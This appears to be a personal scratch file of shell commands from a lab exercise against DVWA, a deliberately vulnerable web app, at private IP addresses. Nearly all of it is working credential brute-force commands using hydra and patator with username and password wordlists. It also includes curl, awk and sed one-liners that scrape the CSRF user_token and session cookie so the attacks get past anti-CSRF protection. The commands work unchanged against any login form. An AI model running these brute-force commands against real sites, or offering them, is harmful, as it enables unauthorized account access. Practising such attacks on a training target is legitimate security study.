CSRF=$(curl -s -c dvwa.cookie "192.168.1.44/DVWA/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')

hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt  -P /usr/share/seclists/Passwords/500-worst-passwords.txt \
  -e ns  -F  -u  -t 1  -w 10  -V  192.168.1.44  http-post-form \
  "/DVWA/login.php:username=^USER^&password=^PASS^&user_token=${CSRF}&Login=Login:S=Location\: index.php:H=Cookie: security=impossible; PHPSESSID=${SESSIONID}"

patator  http_fuzz  method=POST  follow=0  accept_cookie=0 --threads=1  timeout=10 \
  url="http://192.168.1.44/DVWA/login.php" \
  1=/usr/share/seclists/Usernames/top_shortlist.txt  0=/usr/share/seclists/Passwords/500-worst-passwords.txt \
  body="username=FILE1&password=FILE0&user_token=${CSRF}&Login=Login" \
  header="Cookie: security=impossible; PHPSESSID=${SESSIONID}" \
  -x quit:fgrep=index.php




curl -s  http://192.168.110.20 | sed -n "/<pre>/,/<\/pre>/p" 
curl -s  http://192.168.110.20 | sed -n "/<title>/,/<\/title>/p" 
curl -s  http://192.168.110.20 | sed -n "/<title>/,/<\/title>/p"

curl -s  http://192.168.110.20 | sed -n "/<p>/,/<\/p>/p" 

sed -n '/<table class="my-table">/,/<\/table>/p'  <file>

<form action="login.php" method="post">

<input type="text" class="loginInput" size="20" name="username"><br>
<input type="password" class="loginInput" name="password"><br>

<input type="submit" value="Login" name="Login">

<input type="hidden" name="user_token" value="05fb13e70b03acf55502357d5a634a1d">

</form>


CSRF=$(curl -s -c dvwa.cookie "192.168.110.20/DVWA/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${CSRF}&Login=Login" "192.168.110.20/DVWA/login.php"

hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt  -P /usr/share/seclists/Passwords/rockyou-40.txt \
  -e ns  -F  -u  -t 1  -w 10  -v  -V  192.168.110.20  http-get-form \
  "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome to the password protected area:H=Cookie\: security=low; PHPSESSID=${SESSIONID}"

patator  http_fuzz  method=GET  follow=0  accept_cookie=0  --threads=1  timeout=10 \
  url="http://192.168.110.20/DVWA/vulnerabilities/brute/?username=FILE1&password=FILE0&Login=Login" \
  1=/usr/share/seclists/Usernames/top_shortlist.txt  0=/usr/share/seclists/Passwords/rockyou-40.txt \
  header="Cookie: security=low; PHPSESSID=${SESSIONID}" \
  -x quit:fgrep='Welcome to the password protected area'





curl -s -b 'security=low' -b dvwa.cookie 'http://192.168.110.20/DVWA/vulnerabilities/brute/' | sed -n '/<div class="body_padded/,/<\/div/p'
< div class="body_padded">

curl -s -c dvwa.cookie 'http://192.168.110.20/DVWA/login.php' | awk -F 'user_token' '{print $0}'


CSRF=$(curl -s -c dvwa.cookie 'http://192.168.110.20/DVWA/login.php' | awk -f 'value=' )

SESSIONID=$(grep PHPSESSID dvwa.cookie | cut -d $'\t' -f7)
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')


CSRF=$(curl -s -c dvwa.cookie 'http://192.168.110.20/DVWA/login.php' | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)





└─$ curl -s -c dvwa.cookie  http://192.168.110.20/DVWA/login.php | sed -n '/<form action="login.php" method="post">/,/<\/form>/p'
└─$ curl -s -c dvwa.cookie  http://192.168.110.20/DVWA/login.php | sed -n '/<form.*>/,/<\/form>/p'
└─$ curl -s -c dvwa.cookie  http://192.168.110.20/DVWA/login.php | sed -n '/<form.*>/,/<\/form>/p' | sed  '/^[[:space:]]*$/d' | sed 's/^[[:space:]]*//'

curl -s -c dvwa.cookie  http://192.168.110.20/DVWA/login.php | sed -n '/<form.*>/,/<\/form>/p' | sed  '/^[[:space:]]*$/d' | 
sed 's/^[[:space:]]*//' 

<input type='hidden' name='user_token' value='990784a441b2a99cb0eed323b7d88ed7' />

curl -s -c dvwa.cookie  http://192.168.110.20/DVWA/login.php |  sed -n '/user_token/s/.*name="user_token"\s\+value="\([^"]\+\).*/\1/p' 

<input type='hidden' name='user_token' value='b3d8b2b77b9c42de17515130a63481d9' />

curl -s -c dvwa.cookie  http://192.168.110.20/DVWA/login.php |  sed -n "/user_token/s/.*name='user_token'\s\+value='\([^'']\+\).*/\1/p"


sed -n '/token/s/.*name="ltoken"\s\+value="\([^"]\+\).*/\1/p' input_file

└─$ curl -s -c dvwa.cookie  http://192.168.110.20/DVWA/login.php |  sed -n "/user_token/s/.*name='user_token'\s\+value='\([^']\+\).*/\1/p"
a3271b9bf9de788b760f5584450ce83d

└─$ curl -s -c dvwa.cookie  http://192.168.110.20/DVWA/login.php |   awk -F 'value='  '/user_token/ {print $2}' | cut -d "'" -f2
6d1785df68c349116c578419445f2e83
